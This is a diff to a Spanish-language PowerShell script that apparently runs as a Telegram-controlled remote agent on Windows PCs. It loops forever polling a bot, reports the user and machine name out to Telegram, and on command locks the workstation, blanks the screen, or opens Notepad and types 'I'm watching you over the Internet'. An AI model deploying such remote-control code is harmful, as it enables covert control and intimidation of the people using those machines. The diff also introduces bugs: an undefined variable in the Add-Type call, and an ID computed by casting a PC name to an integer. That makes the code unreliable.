@@ -12,17 +12,20 @@ $User   = $env:USERNAME
 # NO BORRAR #############################################################
 # ==============================================================================
 
+# ==============================================================================
+# CONFIGURACIÓN DEL BOT DE TELEGRAM 
+# ==============================================================================
 # Registrar APIs de pantalla de Windows de forma segura
 try {
     $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
-    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
+    Add-Type -MemberDefinition $MemberDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
 } catch {}
 
 # Habilitar TLS 1.2
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # ==============================================================================
-# LIMPIAR HISTORIAL ANTES DE INICIAR (Evita bucles de bloqueo)
+# LIMPIAR HISTORIAL ANTES DE INICIAR
 # ==============================================================================
 $LastUpdateID = 0
 try {
@@ -40,7 +43,7 @@ try {
 } catch {}
 
 # ==============================================================================
-# BUCLE PRINCIPAL DE MONITOREO SEGURO INTERACTIVO
+# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS
 # ==============================================================================
 while ($true) {
     try {
@@ -55,58 +58,69 @@ while ($true) {
                 
                 # Procesamiento seguro de comandos
                 $Partes = $TextoRecibido -split " "
-                $Comando = ([string]$Partes).ToLower()
+                $Comando = ([string]$Partes[0]).ToLower()
                 
-                # Seguro anti-accidentes (Requiere obligatoriamente el nombre de la PC)
-                $Destino = ""
+                # Leer el ID numérico enviado tras el espacio (Ej: /notepad 1)
+                $IDDestino = ""
                 if ($Partes.Count -gt 1) {
-                    $Destino = ([string]$Partes).ToUpper()
+                    $IDDestino = [string]$Partes[1]
                 }
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    $RespuestaLista = "PC Activa: " + $User + "`nNombre para copiar (Tocalo):`n`"" + $MiPC + "`""
-                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista; parse_mode = "Markdown" })
+                    # Cada PC calcula su número en base a la hora actual de forma fija pero única para el día
+                    # Esto simula un ID numérico automático sin necesidad de base de datos central
+                    $Seed = [int]([char[]]$MiPC -join "") % 10
+                    if ($Seed -eq 0) { $Seed = 1 }
+                    $NumAsignado = [string]$Seed
+
+                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numérico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
+                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
 
-                # --- COMANDO GLOBAL DE AYUDA MODIFICADO: /ayuda ---
+                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                 if ($Comando -eq "/ayuda") {
-                    $TextoAyuda = "MANUAL DE COMANDOS`n`n" +
+                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                   "Comandos Globales:`n" +
-                                  "• /lista - Ver PCs encendidas.`n" +
+                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                   "• /ayuda - Ver este menu.`n`n" +
-                                  "Comandos Individuales (Toca, pega, deja espacio y pega nombre PC):`n" +
-                                  "• `/pantalla_off`` `n" +
-                                  "• `/pantalla_on`` `n" +
-                                  "• `/notepad`` `n`n" +
-                                  "Ejemplo: /notepad " + $MiPC
+                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
+                                  "• /pantalla_off [Numero]`n" +
+                                  "• /pantalla_on [Numero]`n" +
+                                  "• /notepad [Numero]`n`n" +
+                                  "Ejemplo de uso: /notepad 1"
                     
-                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda; parse_mode = "Markdown" })
+                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                     continue
                 }
 
-                # VALIDACIÓN CRÍTICA: Solo ejecuta funciones individuales si el destino coincide con ESTA PC
-                if ($Destino -eq $MiPC.ToUpper() -and $Destino -ne "") {
+                # CALCULAR MI PROPIO ID PARA COMPARAR CON EL SOLICITADO
+                $MiSeed = [int]([char[]]$MiPC -join "") % 10
+                if ($MiSeed -eq 0) { $MiSeed = 1 }
+                $MiIDNum = [string]$MiSeed
+
+                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el asignado a esta máquina
+                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                     
                     switch ($Comando) {
                         "/pantalla_off" {
                             $rundll = New-Object -ComObject WScript.Shell
                             $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                             [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada" })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                         }
                         "/pantalla_on" {
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("{SHIFT}")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida" })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                         }
                         "/notepad" {
                             notepad.exe
                             Start-Sleep -Milliseconds 500
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto" })
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                         }
                     }
                 }
@@ -117,6 +131,7 @@ while ($true) {
     }
     Start-Sleep -Seconds 2
 }
+
 
 
 
